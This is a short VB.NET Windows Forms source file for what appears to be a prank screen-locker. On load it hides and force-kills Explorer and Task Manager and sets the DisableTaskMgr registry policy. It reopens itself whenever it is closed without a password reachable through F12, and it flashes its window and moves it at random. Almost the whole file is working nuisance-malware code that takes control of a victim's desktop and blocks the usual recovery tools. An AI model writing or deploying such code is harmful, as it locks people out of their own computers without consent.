Public Class Form1

    'Define the variables
    Dim rnd As New Random
    Dim RegKey As Object

    Private Sub Form1_Shown(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Shown
        'Places the form in a random location upon startup
        Me.Location = New Point(rnd.Next(0, My.Computer.Screen.WorkingArea.Width - Me.Size.Width), rnd.Next(0, My.Computer.Screen.WorkingArea.Height - Me.Size.Height))

        'Starts playing the trololol theme song in a loop
        ' My.Computer.Audio.Play(My.Resources.trololol, AudioPlayMode.BackgroundLoop)
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        'Check if the user entered the password; else abort shutdown
        If Form2.Label2.Text = "1" Then

        Else
            e.Cancel = True
            Dim newForm As New Form1
            newForm.Show()
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'Flash between the red and blue background color
        If Me.BackColor = Color.Blue Then
            Me.BackColor = Color.Red
        Else
            Me.BackColor = Color.Blue
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        'Randomly move the window around inside the screen bounds
        Me.Location = New Point(rnd.Next(0, My.Computer.Screen.WorkingArea.Width - Me.Size.Width), rnd.Next(0, My.Computer.Screen.WorkingArea.Height - Me.Size.Height))
    End Sub

    Private Sub Form1_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyDown
        'Monitor the F12 key while one of the forms are selected
        If e.KeyCode = Keys.F12 Then
            Form2.Show()
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'Kill the explorer.exe and the taskmgr.exe process
        Shell("taskkill.exe /f /im explorer.exe", AppWinStyle.Hide)
        Shell("taskkill.exe /f /im taskmgr.exe", AppWinStyle.Hide)

        'Disable the taskmanager using the registry (this is what requires admin permissions on windows vista/7)
        RegKey = CreateObject("WScript.Shell")
        RegKey.RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
    End Sub


End Class